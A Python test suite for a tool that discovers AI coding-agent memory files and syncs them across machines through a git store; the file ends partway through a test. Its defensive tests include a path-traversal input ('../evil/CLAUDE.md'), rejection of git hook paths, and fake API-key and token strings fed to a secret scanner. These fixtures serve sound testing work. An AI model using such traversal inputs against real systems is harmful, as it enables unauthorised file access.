import json
import os
import shutil
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "src"))

from punk_records import cli, secrets  # noqa: E402
from punk_records.discover import discover, is_memory_path, scan  # noqa: E402
from punk_records.mcp import handle  # noqa: E402
from punk_records.store import PunkError, Store, normalize_remote  # noqa: E402

# Tests mean LF content on every OS. Path.write_text has no `newline` argument before Python 3.10,
# and on Windows it would write CRLF.
Path.write_text = lambda self, data, encoding=None, errors=None: self.write_bytes(  # type: ignore[method-assign]
    data.encode(encoding or "utf-8", errors or "strict"))

GIT_ENV = {"GIT_AUTHOR_NAME": "t", "GIT_AUTHOR_EMAIL": "t@t", "GIT_COMMITTER_NAME": "t",
           "GIT_COMMITTER_EMAIL": "t@t", "GIT_CONFIG_GLOBAL": os.devnull, "GIT_CONFIG_NOSYSTEM": "1"}


def git(*args, cwd):
    subprocess.run(["git", *args], cwd=cwd, check=True, capture_output=True)


class Base(unittest.TestCase):
    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp())
        self._env = dict(os.environ)
        os.environ.update(GIT_ENV)
        os.environ["HOME"] = str(self.tmp / "home")
        os.environ["USERPROFILE"] = str(self.tmp / "home")  # Path.home() on Windows
        (self.tmp / "home").mkdir()

    def tearDown(self):
        os.environ.clear()
        os.environ.update(self._env)

    def project(self, name, remote="git@github.com:Me/App.git"):
        p = self.tmp / name
        p.mkdir(parents=True)
        git("init", "-q", cwd=p)
        git("remote", "add", "origin", remote, cwd=p)
        return p


class TestDiscovery(Base):
    def test_finds_memory_files_and_skips_noise(self):
        p = self.project("app")
        for rel in ["CLAUDE.md", "AGENTS.md", "pkg/CLAUDE.md", ".claude/napkin.md",
                    ".cursor/rules/style.mdc", ".github/copilot-instructions.md",
                    "node_modules/x/CLAUDE.md", "README.md", ".claude/settings.json"]:
            (p / rel).parent.mkdir(parents=True, exist_ok=True)
            (p / rel).write_text("x")
        self.assertEqual(discover(p), [".claude/napkin.md", ".cursor/rules/style.mdc",
                                       ".github/copilot-instructions.md", "AGENTS.md", "CLAUDE.md",
                                       "pkg/CLAUDE.md"])

    def test_never_allows_git_internals(self):
        cfg = {"include": [".git/hooks/*"]}
        self.assertFalse(is_memory_path(".git/hooks/post-checkout", "project", cfg))
        self.assertFalse(is_memory_path("../evil/CLAUDE.md", "project"))

    def test_normalize_remote(self):
        self.assertEqual(normalize_remote("git@github.com:Me/App.git"), "github.com/me/app")
        self.assertEqual(normalize_remote("https://github.com/me/app"), "github.com/me/app")


class TestSecrets(unittest.TestCase):
    def test_detect_and_redact(self):
        text = "use key sk-ant-api03-abcdefghijklmnopqrstuvwxyz\nAKIAABCDEFGHIJKLMNOP\nok"
        hits = secrets.scan(text)
        self.assertEqual([h.kind for h in hits], ["anthropic-key", "aws-access-key"])
        self.assertNotIn("sk-ant", secrets.redact(text))

    def test_generic_secret_ignores_placeholders(self):
        placeholders = [
            "Set api_key: YOUR_API_KEY_GOES_HERE in the config.",
            'password = "xxxxxxxxxxxxxxxxxxxxxxxx"',
            "access_token=EXAMPLE_ACCESS_TOKEN_123456",
            "secret: SECRET_FROM_1PASSWORD_VAULT",
            "password: changeme-changeme-changeme",
            "api-key: your-api-key-from-the-dashboard",
            "password=dummy_password_for_tests_only",
            "api_key = 0000000000000000000000000000",
            "secret: sample-secret-value-goes-here",
        ]
        for text in placeholders:
            self.assertEqual(secrets.scan(text), [], text)
        real = [
            'api_key = "a8f5f167f44f4964e6c998dee827110c"',
            "secret: 9b2d6f0a7c3e4b1d8f6a2c5e7b9d0f13",
            "access_token=ya29-A0ARrdaMabcDEFghiJKLmnoPQRst",
            "password: Zq8vR2mN7xL4pT9wK3",
            "API_KEY=QK7ZPV2M9RXT4WNB6HJD",  # all caps but no underscore: not an env var name
        ]
        for text in real:
            self.assertEqual([h.kind for h in secrets.scan(text)], ["generic-secret"], text)
        # specific key formats are never relaxed, even with placeholder-looking words around them
        self.assertEqual([h.kind for h in secrets.scan("example: sk-ant-api03-abcdefghijklmnopqrstuvwxyz")],
                         ["anthropic-key"])

    def test_allow_marker(self):
        self.assertEqual(secrets.scan("AKIAABCDEFGHIJKLMNOP example  punk:allow"), [])


class TestSync(Base):
    def test_two_machines_via_remote(self):
        remote = self.tmp / "remote.git"
        git("init", "-q", "--bare", str(remote), cwd=self.tmp)

        # Machine A
        a = Store(self.tmp / "a-store")
        a.init(machine="a", track_global=False)
        git("remote", "add", "origin", str(remote), cwd=a.root)
        pa = self.project("a/app")
        (pa / "CLAUDE.md").write_text("# rules\n- use tabs\n")
        sid = a.track(pa)
        self.assertEqual(sid, "github.com/me/app")
        a.sync()

        # Machine B clones the store, tracks its checkout of the same repo
        b = Store(self.tmp / "b-store")
        b.init(str(remote), machine="b", track_global=False)
        pb = self.project("b/app")
        b.track(pb)
        acts = b.sync()
        self.assertIn("add", [x.kind for x in acts])
        self.assertEqual((pb / "CLAUDE.md").read_text(), "# rules\n- use tabs\n")

        # B learns something, A picks it up
        (pb / "CLAUDE.md").write_text("# rules\n- use tabs\n- run tests with make\n")
        b.sync()
        a.sync()
        self.assertIn("run tests with make", (pa / "CLAUDE.md").read_text())

        # Concurrent appends merge (union) instead of conflicting
        (pa / "CLAUDE.md").write_text((pa / "CLAUDE.md").read_text() + "- from A\n")
        (pb / "CLAUDE.md").write_text((pb / "CLAUDE.md").read_text() + "- from B\n")
        a.sync()
        b.sync()
        a.sync()
        for p in (pa, pb):
            text = (p / "CLAUDE.md").read_text()
            self.assertIn("- from A", text)
            self.assertIn("- from B", text)

    def test_bytes_survive_autocrlf(self):
        gitconfig = self.tmp / "gitconfig"
        gitconfig.write_text("[core]\n\tautocrlf = true\n")  # Git for Windows' default
        os.environ["GIT_CONFIG_GLOBAL"] = str(gitconfig)
        remote = self.tmp / "remote.git"
        git("init", "-q", "--bare", str(remote), cwd=self.tmp)
        a = Store(self.tmp / "a-store")
        a.init(machine="a", track_global=False)
        git("remote", "add", "origin", str(remote), cwd=a.root)
        pa = self.project("a/app")
        (pa / "CLAUDE.md").write_bytes(b"lf line\n")
        (pa / "AGENTS.md").write_bytes(b"crlf line\r\n")
        a.track(pa)
        a.sync()
        b = Store(self.tmp / "b-store")
        b.init(str(remote), machine="b", track_global=False)
        pb = self.project("b/app")
        b.track(pb)
        b.sync()
        self.assertEqual((pb / "CLAUDE.md").read_bytes(), b"lf line\n")
        self.assertEqual((pb / "AGENTS.md").read_bytes(), b"crlf line\r\n")
        self.assertEqual(b.sync(), [])
        self.assertEqual(a.sync(), [])

    def two_machines_with_gitconfig(self, gitconfig_text, strip_store_attributes=False):
        gitconfig = self.tmp / "gitconfig"
        gitconfig.write_text(gitconfig_text)
        os.environ["GIT_CONFIG_GLOBAL"] = str(gitconfig)
        remote = self.tmp / "remote.git"
        git("init", "-q", "--bare", str(remote), cwd=self.tmp)
        a = Store(self.tmp / "a-store")
        a.init(machine="a", track_global=False)
        if strip_store_attributes:  # a store whose .gitattributes lacks `* -text`
            (a.root / ".gitattributes").write_text("records/** merge=union\n")
            a.commit("older attributes")
        git("remote", "add", "origin", str(remote), cwd=a.root)
        pa = self.project("a/app")
        (pa / "CLAUDE.md").write_bytes(b"lf line\n")
        a.track(pa)
        a.sync()
        b = Store(self.tmp / "b-store")
        b.init(str(remote), machine="b", track_global=False)
        pb = self.project("b/app")
        b.track(pb)
        b.sync()
        return pb

    def test_store_attributes_beat_global_attributes(self):
        attrs = self.tmp / "attributes"
        attrs.write_text("* text eol=crlf\n")
        pb = self.two_machines_with_gitconfig(f"[core]\n\tattributesFile = {attrs.as_posix()}\n")
        self.assertEqual((pb / "CLAUDE.md").read_bytes(), b"lf line\n")

    def test_clone_disables_autocrlf_even_without_store_attributes(self):
        pb = self.two_machines_with_gitconfig("[core]\n\tautocrlf = true\n", strip_store_attributes=True)
        self.assertEqual((pb / "CLAUDE.md").read_bytes(), b"lf line\n")

    def test_append_keeps_line_endings(self):
        s = Store(self.tmp / "s")
        s.init(track_global=False)
        p = self.project("app")
        (p / "CLAUDE.md").write_bytes(b"one\r\ntwo\r\n")
        sid = s.track(p)
        s.save()
        s.append(sid, "CLAUDE.md", "three")
        self.assertEqual((p / "CLAUDE.md").read_bytes(), b"one\r\ntwo\r\nthree\r\n")
        (p / "napkin.md").write_bytes(b"a\n")
        s.save()
        s.append(sid, "napkin.md", "b\nc")
        self.assertEqual((p / "napkin.md").read_bytes(), b"a\nb\nc\n")
        self.assertEqual(s.save(), [])

    def test_air_gapped_bundle(self):
        a = Store(self.tmp / "a-store")
        a.init(machine="a", track_global=False)
        pa = self.project("a/app")
        (pa / "AGENTS.md").write_text("be nice\n")
        a.track(pa)
        a.save()
        (self.tmp / "usb").mkdir()
        bundle = a.export_bundle(self.tmp / "usb" / "records.bundle")

        c = Store(self.tmp / "c-store")
        c.init(machine="c", track_global=False)
        pc = self.project("c/app")
        c.track(pc)
        c.import_bundle(bundle)
        self.assertEqual((pc / "AGENTS.md").read_text(), "be nice\n")

        # and back again
        (pc / "AGENTS.md").write_text("be nice\nbe brief\n")
        c.save()
        a.import_bundle(c.export_bundle(self.tmp / "usb" / "back.bundle"))
        self.assertEqual((pa / "AGENTS.md").read_text(), "be nice\nbe brief\n")

    def test_conflict_is_reported_not_clobbered(self):
        a = Store(self.tmp / "s")
        a.init(track_global=False)
        p = self.project("app")
        (p / "CLAUDE.md").write_text("v1\n")
        sid = a.track(p)
        a.save()
        # someone else changes the store copy, and the local file also changes
        (a.records / sid / "CLAUDE.md").write_text("store v2\n")
        a.commit("other machine")
        (p / "CLAUDE.md").write_text("local v2\n")
        self.assertEqual([x.kind for x in a.restore()], ["conflict"])
        self.assertEqual((p / "CLAUDE.md").read_text(), "local v2\n")
        a.restore(force=True)
        self.assertEqual((p / "CLAUDE.md").read_text(), "store v2\n")
        self.assertEqual((p / "CLAUDE.md.punk-bak").read_text(), "local v2\n")

    def test_secrets_blocked(self):
        s = Store(self.tmp / "s")
        s.init(track_global=False)
        p = self.project("app")
        (p / "CLAUDE.md").write_text("token ghp_" + "a" * 36 + "\n")
        sid = s.track(p)
        self.assertEqual([x.kind for x in s.save()], ["blocked"])
        self.assertFalse((s.records / sid / "CLAUDE.md").exists())
        s.save(redact=True)
        self.assertIn("[REDACTED:github-token]", (s.records / sid / "CLAUDE.md").read_text())

    def test_deletion_propagates(self):
        s = Store(self.tmp / "s")
        s.init(track_global=False)
        p = self.project("app")
        (p / "napkin.md").write_text("n\n")
        sid = s.track(p)
        s.save()
        (p / "napkin.md").unlink()
        self.assertEqual([x.kind for x in s.save()], ["delete"])
        self.assertFalse((s.records / sid / "napkin.md").exists())

    def test_moved_project_is_not_deleted_from_the_store(self):
        """The project moved and its old folder stayed behind with no clone in it (or another one)."""
        s = Store(self.tmp / "s")
        s.init(track_global=False)
        p = self.project("app")
        (p / "CLAUDE.md").write_text("keep me\n")
        sid = s.track(p)
        s.save()
        shutil.rmtree(p)
        p.mkdir()  # an empty folder at the old path
        for act, n in ((s.save, 1), (s.restore, 1), (s.sync, 2)):  # sync = save + restore
            got = [(x.kind, x.sat) for x in act()]
            self.assertEqual(got, [("missing", sid)] * n, act.__name__)
        self.assertEqual((s.records / sid / "CLAUDE.md").read_text(), "keep me\n")
        self.assertEqual(list(p.iterdir()), [])
        git("init", "-q", cwd=p)
        git("remote", "add", "origin", "git@github.com:Me/Other.git", cwd=p)
        self.assertIn("no longer a clone", s.save()[0].note)
        q = self.project("app-moved")
        (q / "CLAUDE.md").write_text("keep me\n")
        self.assertEqual(s.track(q), sid)
        self.assertEqual([x.kind for x in s.save()], [])
        self.assertEqual((s.records / sid / "CLAUDE.md").read_text(), "keep me\n")

    def test_global_memories(self):
        home = Path(os.environ["HOME"])
        (home / ".claude").mkdir()
        (home / ".claude" / "CLAUDE.md").write_text("I like short answers\n")
        (home / ".claude" / "projects").mkdir()
        (home / ".claude" / "projects" / "CLAUDE.md").write_text("not global\n")
        s = Store(self.tmp / "s")
        s.init()
        s.save()
        self.assertEqual(s.memories("global"), [("global", ".claude/CLAUDE.md")])
        self.assertIn("short answers", s.context(self.tmp))

    def test_xcode_agent_memories(self):
        """Agents run inside Xcode keep their own config under ~/Library/Developer/Xcode/CodingAssistant
        (Claude Agent, Codex, Gemini); their memories, commands, agents and skills are global memories.
        Xcode's MCP list and the agents' settings, credentials and sessions are not."""
        home = Path(os.environ["HOME"])
        ca = home / "Library" / "Developer" / "Xcode" / "CodingAssistant"
        files = {
            "ClaudeAgentConfig/CLAUDE.md": "- Use Swift Testing, not XCTest\n",
            "ClaudeAgentConfig/napkin.md": "- previews need a simulator\n",
            "ClaudeAgentConfig/commands/ship.md": "Build and archive.\n",
            "ClaudeAgentConfig/agents/reviewer.md": "Review SwiftUI.\n",
            "ClaudeAgentConfig/skills/swiftui/SKILL.md": "# SwiftUI\n",
            "codex/AGENTS.md": "- Run xcodebuild test\n",
            "gemini/GEMINI.md": "- Prefer async/await\n",
        }
        never = {
            "mcp-servers.json": '{"mcpServers": {}}\n',
            "ClaudeAgentConfig/.claude": '{"projects": {}}\n',
            "ClaudeAgentConfig/settings.json": "{}\n",
            "ClaudeAgentConfig/projects/x/session.jsonl": "{}\n",
            "ClaudeAgentConfig/projects/x/memory/MEMORY.md": "- a project's auto memory\n",
            "codex/auth.json": '{"token": "x"}\n',
            "codex/config.toml": "model = 'x'\n",
        }
        for rel, text in {**files, **never}.items():
            (ca / rel).parent.mkdir(parents=True, exist_ok=True)
            (ca / rel).write_text(text)
        prefix = "Library/Developer/Xcode/CodingAssistant/"
        self.assertEqual(sorted(scan(home, "global").files), sorted(prefix + r for r in files))
        s = Store(self.tmp / "s")
        s.init()
        s.save()
        self.assertEqual((s.records / "global" / prefix / "ClaudeAgentConfig" / "CLAUDE.md").read_text(),
                         "- Use Swift Testing, not XCTest\n")
        for rel in never:
            self.assertFalse((s.records / "global" / prefix / rel).exists(), rel)


class TestClaudeAutoMemory(Base):
    """Claude Code's auto memory lives outside the project, keyed by the repo's path on this machine."""

    def auto_dir(self, repo: Path) -> Path:
        key = "".join(c if c.isascii() and c.isalnum() else "-" for c in str(repo.resolve()))
        return Path(os.environ["HOME"]) / ".claude" / "projects" / key / "memory"

    def test_saved_from_one_path_and_restored_at_another(self):
        remote = self.tmp / "remote.git"
        git("init", "-q", "--bare", str(remote), cwd=self.tmp)
        a = Store(self.tmp / "a-store")
        a.init(machine="a", track_global=False)
        git("remote", "add", "origin", str(remote), cwd=a.root)
        pa = self.project("a/app")
        (pa / "CLAUDE.md").write_text("rules\n")
        mem = self.auto_dir(pa)
        mem.mkdir(parents=True)
        (mem / "MEMORY.md").write_text("- [Role](user_role.md) - who I am\n")
        (mem / "user_role.md").write_text("backend dev\n")
        (mem / "notes.txt").write_text("not a memory\n")
        sid = a.track(pa)
        self.assertEqual(discover(pa), ["@claude-memory/MEMORY.md", "@claude-memory/user_role.md",
                                        "CLAUDE.md"])
        a.sync()
        self.assertEqual((a.records / sid / "@claude-memory" / "user_role.md").read_text(), "backend dev\n")

        b = Store(self.tmp / "b-store")
        b.init(str(remote), machine="b", track_global=False)
        pb = self.project("b/elsewhere/app")
        b.track(pb)
        b.sync()
        self.assertEqual((self.auto_dir(pb) / "user_role.md").read_text(), "backend dev\n")
        self.assertFalse((pb / "@claude-memory").exists())

        (self.auto_dir(pb) / "user_role.md").write_text("backend dev, likes tests\n")
        self.assertEqual([d.rel for d in b.diff()], ["@claude-memory/user_role.md"])
        b.sync()
        a.sync()
        self.assertEqual((mem / "user_role.md").read_text(), "backend dev, likes tests\n")
        (mem / "user_role.md").unlink()
        self.assertIn(("delete", "@claude-memory/user_role.md"), [(x.kind, x.rel) for x in a.save()])

    def test_worktrees_share_the_main_checkout_memory(self):
        p = self.project("app")
        (p / "CLAUDE.md").write_text("rules\n")
        git("add", "-A", cwd=p)
        git("commit", "-qm", "init", cwd=p)
        wt = self.tmp / "app-wt"
        git("worktree", "add", "-q", str(wt), cwd=p)
        self.auto_dir(p).mkdir(parents=True)
        (self.auto_dir(p) / "MEMORY.md").write_text("shared\n")
        self.assertIn("@claude-memory/MEMORY.md", discover(wt))

    def test_exclude_opts_out_and_secrets_are_blocked(self):
        s = Store(self.tmp / "s")
        s.init(track_global=False)
        p = self.project("app")
        mem = self.auto_dir(p)
        mem.mkdir(parents=True)
        (mem / "MEMORY.md").write_text("token ghp_" + "a" * 36 + "\n")
        sid = s.track(p)
        self.assertEqual([(x.kind, x.rel) for x in s.save()], [("blocked", "@claude-memory/MEMORY.md")])
        (s.root / "punk.json").write_text(json.dumps({"exclude": ["@claude-memory/*"]}))
        self.assertEqual(s.save(), [])
        self.assertFalse((s.records / sid / "@claude-memory").exists())

    def test_claude_config_dir_is_honoured(self):
        p = self.project("app")
        cfg = self.tmp / "claude-cfg"
        os.environ["CLAUDE_CONFIG_DIR"] = str(cfg)
        mem = cfg / "projects" / self.auto_dir(p).parent.name / "memory"
        mem.mkdir(parents=True)
        (mem / "MEMORY.md").write_text("x\n")
        self.assertEqual(discover(p), ["@claude-memory/MEMORY.md"])

    def test_watch_sees_auto_memory_edits(self):
        from punk_records.watch import Watcher
        s = Store(self.tmp / "s")
        s.init(track_global=False)
        p = self.project("app")
        mem = self.auto_dir(p)
        mem.mkdir(parents=True)
        (mem / "MEMORY.md").write_text("one\n")
        sid = s.track(p)
        w = Watcher(s, out=lambda _: None)
        before = w.fingerprint()
        (mem / "MEMORY.md").write_text("one, two\n")
        after = w.fingerprint(full=False)
        self.assertIn("@claude-memory/MEMORY.md", before[sid])
        self.assertNotEqual(before[sid], after[sid])

    def test_a_project_folder_named_like_the_prefix_is_not_auto_memory(self):
        p = self.project("app")
        (p / "@claude-memory").mkdir()
        (p / "@claude-memory" / "MEMORY.md").write_text("x\n")
        self.assertEqual(discover(p), [])


class TestCLIEncoding(Base):
    def test_piped_output_is_utf8(self):
        s = Store(self.tmp / "s")
        s.init(track_global=False)
        p = self.project("app")
        (p / "CLAUDE.md").write_text("- \u2713 \u65e5\u672c\n")
        sid = s.track(p)
        s.save()
        env = {**os.environ, "PYTHONPATH": str(ROOT / "src"), "PYTHONIOENCODING": "cp1252"}  # Windows pipe
        r = subprocess.run([sys.executable, "-m", "punk_records", "--home", str(s.root), "show", sid, "CLAUDE.md"],
                           capture_output=True, env=env)
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertEqual(r.stdout, "- \u2713 \u65e5\u672c\n".encode())

    def _show_through_windows_pipe(self, *args) -> bytes:
        """`punk show` into a stdout that turns "\\n" into "\\r\\n", like a Windows pipe does."""
        import io
        from contextlib import redirect_stdout
        raw = io.BytesIO()
        out = io.TextIOWrapper(raw, encoding="utf-8", newline="\r\n", write_through=True)
        with redirect_stdout(out):
            code = cli.main(["--home", str(self.tmp / "s"), "show", *args])
        out.flush()
        self.assertEqual(code, 0)
        return raw.getvalue()

    def test_show_writes_the_stored_bytes(self):
        s = Store(self.tmp / "s")
        s.init(track_global=False)
        p = self.project("app")
        (p / "CLAUDE.md").write_bytes("v1\n- \u2713\n".encode())
        (p / "AGENTS.md").write_bytes(b"crlf\r\nfile\r\n")
        sid = s.track(p)
        s.save()
        self.assertEqual(self._show_through_windows_pipe(sid, "CLAUDE.md"), "v1\n- \u2713\n".encode())
        self.assertEqual(self._show_through_windows_pipe(sid, "AGENTS.md"), b"crlf\r\nfile\r\n")
        self.assertEqual(s.read(sid, "AGENTS.md"), "crlf\r\nfile\r\n")


class TestPortability(unittest.TestCase):
    def test_product_code_never_writes_text_mode(self):
        """Text-mode writes turn "\\n" into "\\r\\n" on Windows and break byte-exact hashes. The tests
        patch Path.write_text to LF for their own fixtures, so this guard keeps product code off it."""
        import re
        offenders = []
        for f in sorted((ROOT / "src" / "punk_records").glob("*.py")):
            for n, line in enumerate(f.read_text(encoding="utf-8").splitlines(), 1):
                if re.search(r"\.write_text\(|open\([^)]*['\"][wa]t?['\"]", line):
                    offenders.append(f"{f.name}:{n}: {line.strip()}")
        self.assertEqual(offenders, [])


class TestReadme(unittest.TestCase):
    def test_links_work_on_pypi(self):
        """PyPI renders README.md as the project page and cannot resolve relative links or images."""
        import re
        text = (ROOT / "README.md").read_text(encoding="utf-8")
        relative = [t for t in re.findall(r"\]\(([^)\s]+)\)", text) if not t.startswith(("https://", "http://", "#"))]
        relative += re.findall(r"<img[^>]+src=[\"'](?!https?://)([^\"']+)", text)
        self.assertEqual(relative, [])


class TestStoreFormat(Base):
    """docs/store-format.md is a contract for tools that read a store without punk. These tests build
    a real store and check every fact the page states, so a format change has to update the page."""

    def setUp(self):
        super().setUp()
        self.doc = (ROOT / "docs" / "store-format.md").read_text(encoding="utf-8")
        self.store = Store(self.tmp / "store")
        self.store.init(machine="laptop")
        self.app = self.project("app", remote="git@github.com:Acme/Web.git")
        (self.app / "CLAUDE.md").write_text("- one\n")
        (self.app / ".claude" / "agents").mkdir(parents=True)
        (self.app / ".claude" / "agents" / "reviewer.md").write_text("review\n")
        self.linked = can_symlink()  # Windows without the privilege: the rest still runs
        if self.linked:
            os.symlink("CLAUDE.md", self.app / "AGENTS.md")
        self.sid = self.store.track(self.app)
        self.store.save()

    def tracked(self):
        r = subprocess.run(["git", "ls-files"], cwd=self.store.root, capture_output=True, text=True, check=True)
        return set(r.stdout.split())

    def test_branch_and_top_level_files(self):
        import re
        self.assertEqual(self.store.branch(), "main")
        files = self.tracked()
        for name in (".gitattributes", "README.md", "punk.json"):
            self.assertIn(name, files)
            self.assertRegex(self.doc, rf"(?m)^{re.escape(name)} ")  # in the layout block
        self.assertEqual(json.loads((self.store.root / "punk.json").read_text()), {"include": [], "exclude": []})
        self.assertNotIn(".git/punk-state.json", files)
        self.assertTrue((self.store.root / ".git" / "punk-state.json").exists())

    def test_ids_records_and_satellites(self):
        self.assertEqual(self.sid, "github.com/acme/web")
        files = self.tracked()
        self.assertIn("records/github.com/acme/web/CLAUDE.md", files)
        self.assertIn("records/github.com/acme/web/.claude/agents/reviewer.md", files)
        self.assertNotIn("records/github.com/acme/web/AGENTS.md", files)  # a link, recorded in links
        self.assertIn("records/global/.claude/CLAUDE.md", self.doc)
        self.assertEqual((self.store.root / "records" / self.sid / "CLAUDE.md").read_bytes(), b"- one\n")
        meta = json.loads((self.store.root / "satellites" / f"{self.sid}.json").read_text())
        expected = {"name": "app", "kind": "project", "remote": "git@github.com:Acme/Web.git"}
        if self.linked:
            expected["links"] = {"AGENTS.md": "CLAUDE.md"}
        self.assertEqual(meta, expected)
        for key in ("name", "kind", "remote", "links"):
            self.assertIn(f"`{key}`", self.doc)
        glob = json.loads((self.store.root / "satellites" / "global.json").read_text())
        self.assertEqual(glob, {"name": "global", "kind": "global"})
        bare = self.project("Some Tool!", remote="")
        subprocess.run(["git", "remote", "remove", "origin"], cwd=bare, capture_output=True)
        self.assertEqual(self.store.track(bare), "local/some-tool")

    def test_gitattributes_and_messages_are_documented(self):
        from punk_records import store as store_mod
        attrs = (self.store.root / ".gitattributes").read_text()
        self.assertEqual(attrs, store_mod.GITATTRIBUTES)
        for rule in ("* -text", "records/** merge=union"):
            self.assertIn(rule, attrs)
        self.assertIn("`* -text`", self.doc)
        self.assertIn("`merge=union`", self.doc)
        log = subprocess.run(["git", "log", "--format=%s"], cwd=self.store.root, capture_output=True, text=True,
                             check=True).stdout.splitlines()
        self.assertEqual(log[-1], "init punk records on laptop")
        self.assertIn(f"track {self.sid}", log)
        self.assertTrue(log[0].startswith("save "))
        for start in ("`init punk records on <machine>`", "`track <id>`", "`save ...`"):
            self.assertIn(start, self.doc)

    def test_encrypted_remote_names_match(self):
        from punk_records import crypt
        self.assertIn(f"`{crypt.BUNDLE}`", self.doc)
        self.assertEqual(crypt.REF, "refs/heads/main")
        self.assertIn("remote branch `main`", self.doc)


class TestStoreLock(Base):
    """Several punk processes (cron agents, hooks, the MCP server) can write one store at once."""

    def setUp(self):
        super().setUp()
        self.store = Store(self.tmp / "store")
        self.store.init(machine="host", track_global=False)
        app = self.project("app")
        (app / "CLAUDE.md").write_text("# App\n")
        self.sid = self.store.track(app)
        self.store.save()
        self.env = {**os.environ, "PYTHONPATH": str(ROOT / "src"), "PUNK_HOME": str(self.store.root)}

    def punk(self, *args, env=None):
        return subprocess.Popen([sys.executable, "-m", "punk_records", *args], env=env or self.env,
                                stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

    def test_parallel_writers_keep_every_change(self):
        procs = [self.punk("remember", "-s", self.sid, f"lesson {i}") for i in range(8)]
        results = [(p.wait(timeout=120), p.communicate()[1]) for p in procs]
        self.assertEqual([code for code, _ in results], [0] * 8, results)
        text = self.store.read(self.sid, "CLAUDE.md")
        self.assertEqual(sorted(line for line in text.splitlines() if line.startswith("lesson")),
                         sorted(f"lesson {i}" for i in range(8)))
        fsck = subprocess.run(["git", "fsck", "--no-progress"], cwd=self.store.root, capture_output=True, text=True)
        self.assertEqual(fsck.returncode, 0, fsck.stderr)
        log = subprocess.run(["git", "log", "--format=%s"], cwd=self.store.root, capture_output=True, text=True,
                             check=True).stdout
        self.assertEqual(log.count(f"remember in {self.sid}/CLAUDE.md"), 8)

    def test_waits_then_gives_up_with_a_clear_error(self):
        with self.store.lock():
            p = self.punk("remember", "-s", self.sid, "late", env={**self.env, "PUNK_LOCK_TIMEOUT": "0.5"})
            code, err = p.wait(timeout=60), p.communicate()[1]
        self.assertNotEqual(code, 0)
        self.assertIn("another punk process is using the store", err)
        self.assertNotIn("late", self.store.read(self.sid, "CLAUDE.md"))

    def test_reentrant_in_one_process(self):
        os.environ["PUNK_LOCK_TIMEOUT"] = "2"  # a lock that is not re-entrant fails fast here
        with self.store.lock():
            self.store.sync()  # takes the lock again, and calls save inside
            self.store.append(self.sid, "CLAUDE.md", "inside")
        self.assertIn("inside", self.store.read(self.sid, "CLAUDE.md"))

    def test_a_crashed_holder_does_not_leave_it_locked(self):
        # keep a reference to the lock: a dropped one is garbage collected, which unlocks
        code = ("import os, sys; sys.path.insert(0, sys.argv[2]); from punk_records.store import Store; "
                "s = Store(sys.argv[1]); held = s.lock(); held.__enter__(); os._exit(0)")
        subprocess.run([sys.executable, "-c", code, str(self.store.root), str(ROOT / "src")], check=True, timeout=60)
        p = self.punk("remember", "-s", self.sid, "after crash", env={**self.env, "PUNK_LOCK_TIMEOUT": "2"})
        self.assertEqual(p.wait(timeout=60), 0, p.communicate()[1])

    def test_a_hook_reports_a_busy_store(self):
        from punk_records import hooks
        os.environ.pop("PUNK_LOCK_TIMEOUT", None)
        hooks.run(Store(self.tmp / "no-store"), "session-end", "{}")
        self.assertEqual(os.environ["PUNK_LOCK_TIMEOUT"], str(hooks.TIMEOUT - 10))  # shorter than the hook
        os.environ["PUNK_LOCK_TIMEOUT"] = "0.5"
        app = self.store.load_state()["paths"][self.sid]
        code = ("import sys, time; sys.path.insert(0, sys.argv[2]); from punk_records.store import Store; "
                "s = Store(sys.argv[1]); held = s.lock(); held.__enter__(); print('held', flush=True); time.sleep(30)")
        holder = subprocess.Popen([sys.executable, "-c", code, str(self.store.root), str(ROOT / "src")],
                                  stdout=subprocess.PIPE, text=True)
        try:
            self.assertEqual(holder.stdout.readline().strip(), "held")
            code, out, err = hooks.run(self.store, "session-end", json.dumps({"cwd": app}))
        finally:
            holder.kill()
            holder.communicate()
        self.assertEqual((code, out), (2, ""))
        self.assertIn("another punk process is using the store", err)

    def test_lock_file_is_never_committed(self):
        with self.store.lock():
            pass
        self.assertTrue((self.store.root / ".git" / "punk.lock").exists())
        files = subprocess.run(["git", "ls-files"], cwd=self.store.root, capture_output=True, text=True,
                               check=True).stdout.split()
        self.assertFalse([f for f in files if "punk.lock" in f])
        self.assertIn("`.git/punk.lock`", (ROOT / "docs" / "store-format.md").read_text(encoding="utf-8"))


class TestAgentTrailer(Base):
    """--agent / PUNK_AGENT record which agent made a change, as a git trailer a dashboard can read."""

    def setUp(self):
        super().setUp()
        self.store = Store(self.tmp / "store")
        self.store.init(machine="host", track_global=False)
        app = self.project("app")
        (app / "CLAUDE.md").write_text("# App\n")
        self.sid = self.store.track(app)
        self.store.save()
        os.environ["PUNK_HOME"] = str(self.store.root)
        os.environ.pop("PUNK_AGENT", None)

    def cli(self, *args):
        from io import StringIO
        from unittest import mock
        err = StringIO()
        with mock.patch("sys.stderr", err), mock.patch("sys.stdout", StringIO()):
            try:
                code = cli.main(list(args))
            except SystemExit as e:  # argparse errors
                code = e.code
        return code, err.getvalue()

    def agents(self, n=1):
        r = subprocess.run(["git", "log", f"-{n}", "--format=%(trailers:key=Punk-Agent,valueonly)%x00"],
                           cwd=self.store.root, capture_output=True, text=True, check=True)
        return [x.strip() for x in r.stdout.split("\0")[:n]]

    def test_agent_option_adds_a_trailer(self):
        self.assertEqual(self.cli("--agent", "acme/support", "remember", "-s", self.sid, "refunds need a ticket")[0], 0)
        self.assertEqual(self.agents(), ["acme/support"])
        subject = subprocess.run(["git", "log", "-1", "--format=%s"], cwd=self.store.root, capture_output=True,
                                 text=True, check=True).stdout.strip()
        self.assertEqual(subject, f"remember in {self.sid}/CLAUDE.md")

    def test_environment_variable_and_save_message(self):
        os.environ["PUNK_AGENT"] = "acme/implementer"
        (self.tmp / "app" / "CLAUDE.md").write_text("# App\n- run make test\n")
        self.assertEqual(self.cli("save", "-m", "implementer: run 06:00")[0], 0)
        self.assertEqual(self.agents(), ["acme/implementer"])
        body = subprocess.run(["git", "log", "-1", "--format=%B"], cwd=self.store.root, capture_output=True,
                              text=True, check=True).stdout
        self.assertEqual(body.strip(), "implementer: run 06:00\n\nPunk-Agent: acme/implementer")

    def test_no_agent_no_trailer(self):
        self.assertEqual(self.cli("remember", "-s", self.sid, "plain")[0], 0)
